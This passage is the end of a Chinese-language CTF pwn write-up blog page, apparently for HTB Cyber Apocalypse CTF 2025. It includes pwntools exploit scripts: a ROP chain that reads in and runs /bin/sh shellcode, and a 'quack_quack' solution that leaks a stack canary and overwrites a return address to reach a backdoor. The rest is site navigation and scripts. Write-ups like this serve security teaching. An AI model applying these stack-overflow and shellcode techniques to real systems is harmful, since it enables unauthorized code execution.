</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">target</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="nf">pause</span><span class="p">()</span>
<span class="nf">sl</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">sh</span><span class="p">()))</span>
<span class="nf">itr</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h2 id="quack_quack"><span class="me-2">quack_quack</span><a href="#quack_quack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>


<span class="c1">#gdb.attach(io,gdbscript)
</span><span class="n">t</span> <span class="o">=</span> <span class="sh">'</span><span class="s">Quack Quack </span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">=</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x59</span> <span class="o">+</span> <span class="n">t</span>
<span class="nf">pause</span><span class="p">()</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Quack the Duck!</span><span class="se">\n\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Quack Quack </span><span class="sh">'</span><span class="p">)</span>
<span class="n">canary</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">7</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">canary</span><span class="sh">'</span><span class="p">)</span>


<span class="nf">pause</span><span class="p">()</span>
<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x58</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x40137F</span><span class="p">)</span> <span class="c1">#backdoor
</span><span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          本文由作者按照 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         进行授权
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">分享</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FCyber-Apocalypse-CTF-2025-Tales-from-Eldoria%2F&title=HTB%20-%20Cyber%20Apocalypse%20CTF%202025%20Tales%20from%20Eldoria%20-%20Pwn%20WriteUp%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="QQ" aria-label="QQ">
        <i class="fa-fw fa-brands fa-qq"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=HTB%20-%20Cyber%20Apocalypse%20CTF%202025%20Tales%20from%20Eldoria%20-%20Pwn%20WriteUp%20-%20imLZH1'%20Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FCyber-Apocalypse-CTF-2025-Tales-from-Eldoria%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FCyber-Apocalypse-CTF-2025-Tales-from-Eldoria%2F&text=HTB%20-%20Cyber%20Apocalypse%20CTF%202025%20Tales%20from%20Eldoria%20-%20Pwn%20WriteUp%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="分享链接"
      data-title-succeed="链接已复制！"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">最近更新</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/2025CCB/">第二届“长城杯”信息安全铁人三项赛（防护赛）总决赛-Pwn方向部分题解</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/squ1rrel-CTF-PWN-g1P03n/">squ1rrelCTF Pwn WriteUp - g1P03n</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Cyber-Apocalypse-CTF-2025-Tales-from-Eldoria/">HTB - Cyber Apocalypse CTF 2025 Tales from Eldoria - Pwn WriteUp</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CCB_CISCN_AWDP-Pwn/">CCB_CISCN_半决赛-AWDP-Pwn</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Kernel-Pwn-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/">Kernel Pwn 刷题记录</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">文章内容</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->

























            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/CCB_CISCN_AWDP-Pwn/"
      class="btn btn-outline-primary"
      aria-label="上一篇"
    >
      <p>CCB_CISCN_半决赛-AWDP-Pwn</p>
    </a>
  

  
    <a
      href="/posts/squ1rrel-CTF-PWN-g1P03n/"
      class="btn btn-outline-primary"
      aria-label="下一篇"
    >
      <p>squ1rrelCTF Pwn WriteUp - g1P03n</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script type="text/javascript">
  (function () {
    const origin = 'https://giscus.app';
    const iframe = 'iframe.giscus-frame';
    const lightTheme = 'light';
    const darkTheme = 'dark_dimmed';

    let initTheme = lightTheme;
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') &&
        html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') &&
        window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = darkTheme;
    }

    let giscusAttributes = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'imLZH1/me_giscus_Discussions-',
      'data-repo-id': 'comments',
      'data-category': 'general',
      'data-category-id': '',
      'data-mapping': 'pathname',
      'data-reactions-enabled': '1',
      'data-emit-metadata': '0',
      'data-theme': initTheme,
      'data-input-position': 'bottom',
      'data-lang': 'zh-CN',
      'data-loading': 'lazy',
      crossorigin: 'anonymous',
      async: ''
    };

    let giscusScript = document.createElement('script');
    Object.entries(giscusAttributes).forEach(([key, value]) =>
      giscusScript.setAttribute(key, value)
    );
    document.getElementById('tail-wrapper').appendChild(giscusScript);

    addEventListener('message', (event) => {
      if (
        event.source === window &&
        event.data &&
        event.data.direction === ModeToggle.ID
      ) {
        /* global theme mode changed */
        const mode = event.data.message;
        const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme;

        const message = {
          setConfig: {
            theme: theme
          }
        };

        const giscus = document.querySelector(iframe).contentWindow;
        giscus.postMessage({ giscus: message }, origin);
      }
    });
  })();
</script>



            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2025</time>
    <a href="https://user.qzone.qq.com/3461665835">imLZH1</a>.
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="除非另有说明，本网站上的博客文章均由作者按照知识共享署名 4.0 国际 (CC BY 4.0) 许可协议进行授权。"
      >保留部分权利。</span>
    
  </p>
	<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>

  <p>本站采用 <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> 主题 <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">发现新版本的内容。</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      更新
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    <script src="/assets/lib/jquery/jquery.min.js"></script>
  

  
    <script src="/assets/lib/bootstrap/bootstrap.bundle.min.js"></script>
  

  
    <script src="/assets/lib/simple-jekyll-search/simple-jekyll-search.min.js"></script>
  

  
    <script src="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.umd.min.js"></script>
  

  
    <script src="/assets/lib/magnific-popup/jquery.magnific-popup.min.js"></script>
  

  
    <script src="/assets/lib/clipboard/clipboard.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/dayjs.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/locale/en.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/relativeTime.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/localizedFormat.min.js"></script>
  

  
    <script src="/assets/lib/tocbot/tocbot.min.js"></script>
  








<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

